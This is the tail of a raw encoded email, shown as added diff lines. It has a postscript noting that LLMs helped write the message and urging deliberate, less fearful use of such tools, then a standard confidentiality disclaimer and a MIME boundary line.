+PS: LLMs helped with this email, and with more and more of the work I do. I=
+ think we need to move forward with these tools more deliberately and less =
+fearfully.
+Confidential communication. No warranties or commitments unless in a signed=
+ agreement. If received in error, notify sender and delete. Unauthorized us=
+e prohibited.
+
+
+
+
+--_000_FRWP189MB3328A68F0DA5B59C7740E411C3042FRWP189MB3328EURP_--
